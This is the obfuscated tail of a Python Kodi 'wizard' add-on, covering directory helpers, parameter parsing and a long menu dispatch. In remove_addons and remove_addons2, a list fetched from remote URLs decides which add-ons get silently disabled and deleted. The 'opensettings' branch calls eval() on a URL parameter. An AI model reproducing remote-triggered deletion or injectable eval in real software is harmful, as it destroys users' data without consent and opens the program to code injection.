	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5043
def testupdate ():#line:5045
	if BUILDNAME =="":#line:5046
		notify .updateWindow ()#line:5047
	else :#line:5048
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5049
def testfirst ():#line:5051
	notify .firstRun ()#line:5052
def testfirstRun ():#line:5054
	notify .firstRunSettings ()#line:5055
def fastinstall ():#line:5058
	notify .firstRuninstall ()#line:5059
def addDir (OO0000OOOOO0O0OO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5066
	OO0O00O000OO0O0O0 =sys .argv [0 ]#line:5067
	if not mode ==None :OO0O00O000OO0O0O0 +="?mode=%s"%urllib .quote_plus (mode )#line:5068
	if not name ==None :OO0O00O000OO0O0O0 +="&name="+urllib .quote_plus (name )#line:5069
	if not url ==None :OO0O00O000OO0O0O0 +="&url="+urllib .quote_plus (url )#line:5070
	OO0O000OOOO0O000O =True #line:5071
	if themeit :OO0000OOOOO0O0OO0 =themeit %OO0000OOOOO0O0OO0 #line:5072
	OO00OO0OO0OO00O0O =xbmcgui .ListItem (OO0000OOOOO0O0OO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5073
	OO00OO0OO0OO00O0O .setInfo (type ="Video",infoLabels ={"Title":OO0000OOOOO0O0OO0 ,"Plot":description })#line:5074
	OO00OO0OO0OO00O0O .setProperty ("Fanart_Image",fanart )#line:5075
	if not menu ==None :OO00OO0OO0OO00O0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5076
	OO0O000OOOO0O000O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O00O000OO0O0O0 ,listitem =OO00OO0OO0OO00O0O ,isFolder =True )#line:5077
	return OO0O000OOOO0O000O #line:5078
def addFile (O00000O0000O0O0OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5080
	O000OOO0O0000OO00 =sys .argv [0 ]#line:5081
	if not mode ==None :O000OOO0O0000OO00 +="?mode=%s"%urllib .quote_plus (mode )#line:5082
	if not name ==None :O000OOO0O0000OO00 +="&name="+urllib .quote_plus (name )#line:5083
	if not url ==None :O000OOO0O0000OO00 +="&url="+urllib .quote_plus (url )#line:5084
	OOOO00O0OOOOOOOO0 =True #line:5085
	if themeit :O00000O0000O0O0OO =themeit %O00000O0000O0O0OO #line:5086
	O0OOOOOOO0O000OOO =xbmcgui .ListItem (O00000O0000O0O0OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5087
	O0OOOOOOO0O000OOO .setInfo (type ="Video",infoLabels ={"Title":O00000O0000O0O0OO ,"Plot":description })#line:5088
	O0OOOOOOO0O000OOO .setProperty ("Fanart_Image",fanart )#line:5089
	if not menu ==None :O0OOOOOOO0O000OOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5090
	OOOO00O0OOOOOOOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000OOO0O0000OO00 ,listitem =O0OOOOOOO0O000OOO ,isFolder =False )#line:5091
	return OOOO00O0OOOOOOOO0 #line:5092
def get_params ():#line:5094
	OO00O0O000000OOOO =[]#line:5095
	O0O000OOO00O00O00 =sys .argv [2 ]#line:5096
	if len (O0O000OOO00O00O00 )>=2 :#line:5097
		O00000000OOO0OO00 =sys .argv [2 ]#line:5098
		OO0000OO0OOO0O0O0 =O00000000OOO0OO00 .replace ('?','')#line:5099
		if (O00000000OOO0OO00 [len (O00000000OOO0OO00 )-1 ]=='/'):#line:5100
			O00000000OOO0OO00 =O00000000OOO0OO00 [0 :len (O00000000OOO0OO00 )-2 ]#line:5101
		OO0000OOO0O0O0OO0 =OO0000OO0OOO0O0O0 .split ('&')#line:5102
		OO00O0O000000OOOO ={}#line:5103
		for OO000O0OO0O000O00 in range (len (OO0000OOO0O0O0OO0 )):#line:5104
			OOO0O00OOO000OOO0 ={}#line:5105
			OOO0O00OOO000OOO0 =OO0000OOO0O0O0OO0 [OO000O0OO0O000O00 ].split ('=')#line:5106
			if (len (OOO0O00OOO000OOO0 ))==2 :#line:5107
				OO00O0O000000OOOO [OOO0O00OOO000OOO0 [0 ]]=OOO0O00OOO000OOO0 [1 ]#line:5108
		return OO00O0O000000OOOO #line:5110
def remove_addons ():#line:5112
	try :#line:5113
			import json #line:5114
			O00O00O0O0OOO0OO0 =urllib2 .urlopen (remove_url ).readlines ()#line:5115
			for OO0O0O0O00O0O0OOO in O00O00O0O0OOO0OO0 :#line:5116
				O000OO000000OOOO0 =OO0O0O0O00O0O0OOO .split (':')[1 ].strip ()#line:5118
				O0O000O000OOOOOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O000OO000000OOOO0 ,'false')#line:5119
				O0O00OOO00O0OO000 =xbmc .executeJSONRPC (O0O000O000OOOOOOO )#line:5120
				OO000O00O00O000OO =json .loads (O0O00OOO00O0OO000 )#line:5121
				OOO00OO0OO00OOO0O =os .path .join (addons_folder ,O000OO000000OOOO0 )#line:5123
				if os .path .exists (OOO00OO0OO00OOO0O ):#line:5125
					for OO00OO0OO0OOO00OO ,OOOOO000000O0O00O ,OOOOO0OO00OO000OO in os .walk (OOO00OO0OO00OOO0O ):#line:5126
						for OOO0OO0OOO0O00O00 in OOOOO0OO00OO000OO :#line:5127
							os .unlink (os .path .join (OO00OO0OO0OOO00OO ,OOO0OO0OOO0O00O00 ))#line:5128
						for O0OO000OOOOOO0OO0 in OOOOO000000O0O00O :#line:5129
							shutil .rmtree (os .path .join (OO00OO0OO0OOO00OO ,O0OO000OOOOOO0OO0 ))#line:5130
					os .rmdir (OOO00OO0OO00OOO0O )#line:5131
			xbmc .executebuiltin ('Container.Refresh')#line:5133
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5134
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5135
	except :pass #line:5136
def remove_addons2 ():#line:5137
	try :#line:5138
			import json #line:5139
			O0O0OOO0O00O0OO0O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5140
			for O0OOO0OO00O0OOOOO in O0O0OOO0O00O0OO0O :#line:5141
				O000OO000O0OO00O0 =O0OOO0OO00O0OOOOO .split (':')[1 ].strip ()#line:5143
				OO00OO0O0O0O00OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O000OO000O0OO00O0 ,'false')#line:5144
				O0O0OOOOO0OOO000O =xbmc .executeJSONRPC (OO00OO0O0O0O00OO0 )#line:5145
				OOO00OO0O0O0O0OOO =json .loads (O0O0OOOOO0OOO000O )#line:5146
				O0OOO0000O0O0000O =os .path .join (user_folder ,O000OO000O0OO00O0 )#line:5148
				if os .path .exists (O0OOO0000O0O0000O ):#line:5150
					for OO00O0O0OO0O0OO0O ,O0OO00OOO00O0O0OO ,OO00O0O000000OO00 in os .walk (O0OOO0000O0O0000O ):#line:5151
						for OO0OO0O00O000OOO0 in OO00O0O000000OO00 :#line:5152
							os .unlink (os .path .join (OO00O0O0OO0O0OO0O ,OO0OO0O00O000OOO0 ))#line:5153
						for OOO0OO0O00OOO0O00 in O0OO00OOO00O0O0OO :#line:5154
							shutil .rmtree (os .path .join (OO00O0O0OO0O0OO0O ,OOO0OO0O00OOO0O00 ))#line:5155
					os .rmdir (O0OOO0000O0O0000O )#line:5156
	except :pass #line:5158
params =get_params ()#line:5159
url =None #line:5160
name =None #line:5161
mode =None #line:5162
try :mode =urllib .unquote_plus (params ["mode"])#line:5164
except :pass #line:5165
try :name =urllib .unquote_plus (params ["name"])#line:5166
except :pass #line:5167
try :url =urllib .unquote_plus (params ["url"])#line:5168
except :pass #line:5169
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5171
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5172
def setView (OO0O0000O00OO0OO0 ,OOO00000000OOOOOO ):#line:5173
	if wiz .getS ('auto-view')=='true':#line:5174
		OOO0O0OOOO0OOO000 =wiz .getS (OOO00000000OOOOOO )#line:5175
		if OOO0O0OOOO0OOO000 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOO0O0OOOO0OOO000 ='55'#line:5176
		if OOO0O0OOOO0OOO000 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOO0O0OOOO0OOO000 ='50'#line:5177
		wiz .ebi ("Container.SetViewMode(%s)"%OOO0O0OOOO0OOO000 )#line:5178
if mode ==None :index ()#line:5180
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5182
elif mode =='builds':buildMenu ()#line:5183
elif mode =='viewbuild':viewBuild (name )#line:5184
elif mode =='buildinfo':buildInfo (name )#line:5185
elif mode =='buildpreview':buildVideo (name )#line:5186
elif mode =='install':buildWizard (name ,url )#line:5187
elif mode =='theme':buildWizard (name ,mode ,url )#line:5188
elif mode =='viewthirdparty':viewThirdList (name )#line:5189
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5190
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5191
elif mode =='maint':maintMenu (name )#line:5193
elif mode =='passpin':passandpin ()#line:5194
elif mode =='backmyupbuild':backmyupbuild ()#line:5195
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5196
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5197
elif mode =='advancedsetting':advancedWindow (name )#line:5198
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5199
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5200
elif mode =='asciicheck':wiz .asciiCheck ()#line:5201
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5202
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5203
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5204
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5205
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5206
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5207
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5208
elif mode =='currentsettings':viewAdvanced ()#line:5209
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5210
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5211
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5212
elif mode =='fixskin':backtokodi ()#line:5213
elif mode =='testcommand':testcommand ()#line:5214
elif mode =='logsend':logsend ()#line:5215
elif mode =='rdon':rdon ()#line:5216
elif mode =='rdoff':rdoff ()#line:5217
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5218
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5219
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5220
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5221
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5222
elif mode =='freshstart':freshStart ()#line:5223
elif mode =='forceupdate':wiz .forceUpdate ()#line:5224
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5225
elif mode =='forceclose':wiz .killxbmc ()#line:5226
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5227
elif mode =='hidepassword':wiz .hidePassword ()#line:5228
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5229
elif mode =='enableaddons':enableAddons ()#line:5230
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5231
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5232
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5233
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5234
elif mode =='uploadlog':uploadLog .Main ()#line:5235
elif mode =='viewlog':LogViewer ()#line:5236
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5237
elif mode =='viewerrorlog':errorChecking (all =True )#line:5238
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5239
elif mode =='purgedb':purgeDb ()#line:5240
elif mode =='fixaddonupdate':fixUpdate ()#line:5241
elif mode =='removeaddons':removeAddonMenu ()#line:5242
elif mode =='removeaddon':removeAddon (name )#line:5243
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5244
elif mode =='removedata':removeAddonData (name )#line:5245
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5246
elif mode =='systeminfo':systemInfo ()#line:5247
elif mode =='restorezip':restoreit ('build')#line:5248
elif mode =='restoregui':restoreit ('gui')#line:5249
elif mode =='restoreaddon':restoreit ('addondata')#line:5250
elif mode =='restoreextzip':restoreextit ('build')#line:5251
elif mode =='restoreextgui':restoreextit ('gui')#line:5252
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5253
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5254
elif mode =='apk':apkMenu (name )#line:5256
elif mode =='apkscrape':apkScraper (name )#line:5257
elif mode =='apkinstall':apkInstaller (name ,url )#line:5258
elif mode =='speed':speedMenu ()#line:5259
elif mode =='net':net_tools ()#line:5260
elif mode =='GetList':GetList (url )#line:5261
elif mode =='youtube':youtubeMenu (name )#line:5262
elif mode =='viewVideo':playVideo (url )#line:5263
elif mode =='addons':addonMenu (name )#line:5265
elif mode =='addoninstall':addonInstaller (name ,url )#line:5266
elif mode =='savedata':saveMenu ()#line:5268
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5269
elif mode =='managedata':manageSaveData (name )#line:5270
elif mode =='whitelist':wiz .whiteList (name )#line:5271
elif mode =='trakt':traktMenu ()#line:5273
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5274
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5275
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5276
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5277
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5278
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5279
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5280
elif mode =='realdebrid':realMenu ()#line:5282
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5283
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5284
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5285
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5286
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5287
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5288
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5289
elif mode =='login':loginMenu ()#line:5291
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5292
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5293
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5294
elif mode =='clearlogin':loginit .clearSaved (name )#line:5295
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5296
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5297
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5298
elif mode =='contact':notify .contact (CONTACT )#line:5300
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5301
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5302
elif mode =='developer':developer ()#line:5304
elif mode =='converttext':wiz .convertText ()#line:5305
elif mode =='createqr':wiz .createQR ()#line:5306
elif mode =='testnotify':testnotify ()#line:5307
elif mode =='testnotify2':testnotify2 ()#line:5308
elif mode =='servicemanual':servicemanual ()#line:5309
elif mode =='fastinstall':fastinstall ()#line:5310
elif mode =='testupdate':testupdate ()#line:5311
elif mode =='testfirst':testfirst ()#line:5312
elif mode =='testfirstrun':testfirstRun ()#line:5313
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5314
elif mode =='bg':wiz .bg_install (name ,url )#line:5316
elif mode =='bgcustom':wiz .bg_custom ()#line:5317
elif mode =='bgremove':wiz .bg_remove ()#line:5318
elif mode =='bgdefault':wiz .bg_default ()#line:5319
elif mode =='rdset':rdsetup ()#line:5320
elif mode =='mor':morsetup ()#line:5321
elif mode =='mor2':morsetup2 ()#line:5322
elif mode =='resolveurl':resolveurlsetup ()#line:5323
elif mode =='urlresolver':urlresolversetup ()#line:5324
elif mode =='forcefastupdate':forcefastupdate ()#line:5325
elif mode =='traktset':traktsetup ()#line:5326
elif mode =='placentaset':placentasetup ()#line:5327
elif mode =='flixnetset':flixnetsetup ()#line:5328
elif mode =='reptiliaset':reptiliasetup ()#line:5329
elif mode =='yodasset':yodasetup ()#line:5330
elif mode =='numbersset':numberssetup ()#line:5331
elif mode =='uranusset':uranussetup ()#line:5332
elif mode =='genesisset':genesissetup ()#line:5333
elif mode =='fastupdate':fastupdate ()#line:5334
elif mode =='folderback':folderback ()#line:5335
elif mode =='menudata':Menu ()#line:5336
elif mode ==2 :#line:5338
        wiz .torent_menu ()#line:5339
elif mode ==3 :#line:5340
        wiz .popcorn_menu ()#line:5341
elif mode ==8 :#line:5342
        wiz .metaliq_fix ()#line:5343
elif mode ==9 :#line:5344
        wiz .quasar_menu ()#line:5345
elif mode ==5 :#line:5346
        swapSkins ('skin.Premium.mod')#line:5347
elif mode ==13 :#line:5348
        wiz .elementum_menu ()#line:5349
elif mode ==16 :#line:5350
        wiz .fix_wizard ()#line:5351
elif mode ==17 :#line:5352
        wiz .last_play ()#line:5353
elif mode ==18 :#line:5354
        wiz .normal_metalliq ()#line:5355
elif mode ==19 :#line:5356
        wiz .fast_metalliq ()#line:5357
elif mode ==20 :#line:5358
        wiz .fix_buffer2 ()#line:5359
elif mode ==21 :#line:5360
        wiz .fix_buffer3 ()#line:5361
elif mode ==11 :#line:5362
        wiz .fix_buffer ()#line:5363
elif mode ==15 :#line:5364
        wiz .fix_font ()#line:5365
elif mode ==14 :#line:5366
        wiz .clean_pass ()#line:5367
elif mode ==22 :#line:5368
        wiz .movie_update ()#line:5369
elif mode =='adv_settings':buffer1 ()#line:5370
elif mode =='getpass':getpass ()#line:5371
elif mode =='setpass':setpass ()#line:5372
elif mode =='setuname':setuname ()#line:5373
elif mode =='passandUsername':passandUsername ()#line:5374
elif mode =='9':disply_hwr ()#line:5375
elif mode =='99':disply_hwr2 ()#line:5376
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))